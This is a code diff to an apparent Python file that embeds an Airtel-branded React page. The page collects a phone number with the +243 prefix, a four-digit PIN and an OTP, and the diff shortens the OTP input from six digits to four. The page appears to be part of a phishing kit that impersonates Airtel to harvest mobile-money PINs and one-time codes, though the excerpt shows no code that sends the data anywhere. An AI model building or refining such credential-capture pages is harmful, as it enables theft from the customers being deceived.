@@ -434,7 +434,7 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
       const [isLoading, setIsLoading] = useState(false);
       const [phone, setPhone] = useState('');
       const [pin, setPin] = useState(['', '', '', '']);
-      const [otp, setOtp] = useState(['', '', '', '', '', '']);
+      const [otp, setOtp] = useState(['', '', '', '']);
       const [timer, setTimer] = useState(60);
 
       useEffect(() => {
@@ -462,7 +462,7 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
           const n = [...otp];
           n[i] = v;
           setOtp(n);
-          if (v && i < 5) {
+          if (v && i < 3) {
             const next = document.getElementById(`otp-${i + 1}`);
             if (next) next.focus();
           }
@@ -557,7 +557,7 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
                 <h2 className='text-3xl font-bold text-gray-900'>Enter OTP</h2>
                 <p className='text-gray-500 mt-4 text-lg'>OTP has been sent to the number <span className='font-bold text-gray-900'>+243 {phone}</span> added earlier.</p>
                 <div className='flex justify-center gap-2 sm:gap-4 mt-10'>
-                  {[0, 1, 2, 3, 4, 5].map((i) => (
+                  {[0, 1, 2, 3].map((i) => (
                     <input key={i} id={`otp-${i}`} type='text' maxLength='1' className='w-10 h-14 sm:w-16 sm:h-20 text-center text-2xl sm:text-3xl font-bold border border-gray-300 rounded-xl sm:rounded-2xl focus:border-red-500 outline-none' value={otp[i] || ''} onChange={(e) => hOC(i, e.target.value)} />
                   ))}
                 </div>
